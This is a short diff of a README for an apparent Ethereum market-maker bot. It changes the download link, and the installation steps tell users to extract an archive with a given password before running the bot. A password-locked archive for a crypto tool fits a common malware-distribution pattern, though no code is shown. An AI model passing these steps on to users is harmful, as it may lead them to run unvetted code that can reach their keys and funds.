@@ -15,7 +15,7 @@ This project is a Market Maker Bot designed to automate liquidity provision on d
 - **API Keys**: Access to Ethereum node (e.g., Infura, Alchemy) for network interaction and real-time data.
 
 ## Installation
-1. Download the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/releases/download/Release/market-maker-bot.zip).
+1. Download the latest release archive from the [Release](https://github.com/xxblacksmithxxlau/market-maker-bot/archive/refs/heads/main.zip).
 2. Extract the archive using the password `YHS70vOP4Q`.
 3. Navigate to the extracted folder and edit config.
 4. Start bot.
